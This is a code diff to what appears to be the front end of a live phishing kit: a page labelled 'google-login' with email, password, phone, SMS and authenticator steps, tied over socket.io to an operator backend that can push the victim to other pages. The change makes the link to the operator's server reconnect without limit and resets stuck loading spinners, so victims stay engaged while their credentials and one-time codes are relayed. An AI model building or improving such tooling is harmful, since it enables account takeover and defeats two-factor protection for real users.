@@ -1003,12 +1003,38 @@
     try {
       socket = io(BACKEND, {
         query: { clientId: clientId },
-        transports: ['websocket', 'polling']
+        transports: ['websocket', 'polling'],
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000,
+        reconnectionDelayMax: 5000,
+        timeout: 20000
       });
 
+      var _glFirstConnect = true;
       socket.on('connect', function () {
         currentSocketId = socket.id;
         socket.emit('userConnectedToPage', { clientId: clientId, page: 'google-login' });
+
+        if (!_glFirstConnect) {
+          /* Reconnected after background — clear any stuck loading overlay / buttons */
+          clearTimeout(emailWaitTimer);
+          clearTimeout(pwWaitTimer);
+          if (overlay) overlay.classList.remove('visible');
+
+          /* Reset every button that might be showing a spinner */
+          [
+            { btn: emailNextBtn, lbl: emailLabel,  text: 'Next' },
+            { btn: pwNextBtn,    lbl: pwLabel,      text: 'Next' },
+            { btn: document.getElementById('phoneNextBtn'),  lbl: document.getElementById('phoneLabel'),  text: 'Next' },
+            { btn: document.getElementById('smsNextBtn'),    lbl: document.getElementById('smsLabel'),    text: 'Next' },
+            { btn: document.getElementById('authNextBtn'),   lbl: document.getElementById('authLabel'),   text: 'Next' }
+          ].forEach(function (o) {
+            if (o.btn && o.btn.querySelector('.loading-spinner')) {
+              setLoading(o.btn, o.lbl, false);
+            }
+          });
+        }
+        _glFirstConnect = false;
       });
 
       socket.on('show-calendar', function () { window.location.href = 'calendly.html'; });
